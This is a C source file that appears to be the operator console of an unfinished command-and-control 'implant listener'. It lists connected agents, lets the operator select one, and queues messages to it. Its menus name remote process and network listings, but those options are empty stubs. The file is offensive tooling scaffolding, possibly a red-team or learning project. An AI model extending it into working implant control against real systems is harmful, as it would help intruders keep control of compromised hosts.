#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <pthread.h>
#include <poll.h>

#include "console.h"
#include "queue.h"
#include "implant.h"

#define BUFFERSIZE 256

// Global variables
extern struct implant_poll *poll_struct;
extern pthread_mutex_t poll_lock;
// Receive Queue
extern struct Queue* receive_queue;
extern pthread_mutex_t receive_queue_lock;
// Send Queue
extern struct Queue* send_queue;
extern pthread_mutex_t send_queue_lock;

int agent_console(int agent_fd){
	char* menu = "Implant %d selected.\n"
				 "Provide an option.\n"
				 "1 - send message\n"
				 "2 - something else\n"
				 "3 - TBD\n"
				 "4 - next thing here\n";
	char buffer[BUFFERSIZE];
	char* buf;
	struct Message* message;
	long option;
	printf(menu, agent_fd);
				 
	fgets(buffer, BUFFERSIZE, stdin);
	option = strtol(buffer, NULL, 10);
	switch(option){
        case 1:
        	printf("What do you want to send?");
        	buf = malloc(BUFFERSIZE);
        	fgets(buf, BUFFERSIZE - 1, stdin);
        	
        	message = malloc(BUFFERSIZE);
        	message->sockfd = agent_fd;
        	message->buffer = buf;
        	
        	pthread_mutex_lock(&send_queue_lock);
        	enqueue(send_queue, message);
        	pthread_mutex_unlock(&send_queue_lock);
        	break;
        case 2:
        	break;
        case 3:
        	break;
        default:
        	printf("Unknown option selected\n");
        	break;
    }
	
	return 0;
}


void *console(void *vargp){
	int *fd_count = poll_struct->fd_count;
	struct pollfd *pfds = poll_struct->pfds;
	
	char* menu = "Welcome to the implant listener.\n"
				 "Provide an option.\n"
				 "1 - list active agents\n"
				 "2 - select active agent\n"
				 "3 - get processes (ps -aux)\n"
				 "4 - get network statistics (netstat -plantu)\n";
	char buffer[BUFFERSIZE];
	long option;
				 
	printf("%s", menu);
	
	while(fgets(buffer, BUFFERSIZE, stdin)){
		option = strtol(buffer, NULL, 10);
		switch(option){
            case 1:
            	pthread_mutex_lock(&poll_lock);
            	for (int i = 0; i < *fd_count; i++){
					printf("Agent %d\n", pfds[i].fd);
				}
				pthread_mutex_unlock(&poll_lock);
            	break;
            case 2:
            	printf("Which agent?\n");
            	fgets(buffer, BUFFERSIZE, stdin);
            	option = strtol(buffer, NULL, 10);
            	agent_console(option);
            	break;
            case 3:
            	break;
            default:
            	printf("Unknown option selected\n");
            	break;
        }
        
    	printf("\n%s", menu);
	}
	return 0;
}